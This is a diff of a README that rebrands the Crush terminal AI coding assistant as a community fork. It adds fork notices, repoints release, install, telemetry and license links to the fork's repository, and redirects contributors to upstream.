@@ -2,10 +2,17 @@
 
 English | [中文](README.zh.md)
 
+> [!IMPORTANT]
+> **This is a fork.** Crush is the terminal AI coding assistant by
+> [Charm](https://charm.land). This repository is a community fork of
+> [charmbracelet/crush](https://github.com/charmbracelet/crush); it tracks the
+> upstream project and may carry fork-specific changes. For the original
+> project, official docs, and releases, see the [upstream repository](https://github.com/charmbracelet/crush).
+
 <p align="center">
     <a href="https://stuff.charm.sh/crush/charm-crush.png"><img width="450" alt="Charm Crush Logo" src="https://github.com/user-attachments/assets/cf8ca3ce-8b02-43f0-9d0f-5a331488da4b" /></a><br />
-    <a href="https://github.com/charmbracelet/crush/releases"><img src="https://img.shields.io/github/release/charmbracelet/crush" alt="Latest Release"></a>
-    <a href="https://github.com/charmbracelet/crush/actions"><img src="https://github.com/charmbracelet/crush/actions/workflows/build.yml/badge.svg" alt="Build Status"></a>
+    <a href="https://github.com/f69wrthhqd-blip/crush/releases"><img src="https://img.shields.io/github/release/f69wrthhqd-blip/crush" alt="Latest Release"></a>
+    <a href="https://github.com/f69wrthhqd-blip/crush/actions"><img src="https://github.com/f69wrthhqd-blip/crush/actions/workflows/build.yml/badge.svg" alt="Build Status"></a>
 </p>
 
 <p align="center">Your new coding bestie, now available in your favourite terminal.<br />Your tools, your code, and your workflows, wired into your LLM of choice.</p>
@@ -24,6 +31,12 @@ English | [中文](README.zh.md)
 - **Industrial Grade:** built on the Charm ecosystem, powering 25k+ applications, from leading open source projects to business-critical infrastructure
 
 ## Installation
+
+> [!IMPORTANT]
+> This is a fork. The package manager commands below install the **upstream**
+> Crush releases published by Charm, not this fork. To run this fork, use the
+> `go install` commands below (build from source) or grab a binary from [the
+> fork's releases][releases].
 
 Use a package manager:
 
@@ -160,12 +173,12 @@ Or, download it:
 - [Packages][releases] are available in Debian and RPM formats
 - [Binaries][releases] are available for Linux, macOS, Windows, FreeBSD, OpenBSD, and NetBSD
 
-[releases]: https://github.com/charmbracelet/crush/releases
+[releases]: https://github.com/f69wrthhqd-blip/crush/releases
 
-Or just install it with Go:
+Or just install it with Go (this installs **this fork**, building from source):
 
 ```
-go install github.com/charmbracelet/crush@latest
+go install github.com/f69wrthhqd-blip/crush@latest
 ```
 
 On illumos (OpenIndiana, OmniOS), the command above works as-is. Only native
@@ -174,7 +187,7 @@ the terminal bell still work. On Oracle Solaris, add `-tags sqlite3_dotlk` so
 the local database uses dot-file locking:
 
 ```
-go install -tags sqlite3_dotlk github.com/charmbracelet/crush@latest
+go install -tags sqlite3_dotlk github.com/f69wrthhqd-blip/crush@latest
 ```
 
 > [!WARNING]
@@ -1069,8 +1082,8 @@ which maintainers rely on to inform development and support priorities. The
 metrics include solely usage metadata; prompts and responses are NEVER
 collected.
 
-Details on exactly what’s collected are in the source code ([here](https://github.com/charmbracelet/crush/tree/main/internal/event)
-and [here](https://github.com/charmbracelet/crush/blob/main/internal/llm/agent/event.go)).
+Details on exactly what’s collected are in the source code ([here](https://github.com/f69wrthhqd-blip/crush/tree/main/internal/event)
+and [here](https://github.com/f69wrthhqd-blip/crush/blob/main/internal/event/event.go)).
 
 You can opt out of metrics collection at any time by setting the environment
 variable by setting the following in your environment:
@@ -1097,7 +1110,10 @@ Installing an extra tool might be needed on Unix-like environments.
 
 ## Contributing
 
-See the [contributing guide](https://github.com/charmbracelet/crush?tab=contributing-ov-file#contributing).
+This is a fork of the upstream [Crush](https://github.com/charmbracelet/crush)
+project. Improvements that are not specific to this fork are best contributed
+directly upstream; see the [upstream contributing guide](https://github.com/charmbracelet/crush?tab=contributing-ov-file#contributing).
+Fork-specific changes can be proposed via pull requests to this repository.
 
 ## Whatcha think?
 
@@ -1114,13 +1130,10 @@ We’d love to hear your thoughts on this project. Need help? We gotchu. You can
 
 ## License
 
-[FSL-1.1-MIT](https://github.com/charmbracelet/crush/raw/main/LICENSE.md)
+[FSL-1.1-MIT](https://github.com/f69wrthhqd-blip/crush/raw/main/LICENSE.md)
 
 ---
 
-Part of [Charm](https://charm.land).
-
-<a href="https://charm.land/"><img alt="The Charm logo" width="400" src="https://stuff.charm.sh/charm-banner-softy.jpg" /></a>
-
-<!--prettier-ignore-->
-Charm热爱开源 • Charm loves open source
+Fork of [Crush](https://github.com/charmbracelet/crush), the terminal AI coding
+assistant by [Charm](https://charm.land). Original repository:
+[charmbracelet/crush](https://github.com/charmbracelet/crush).
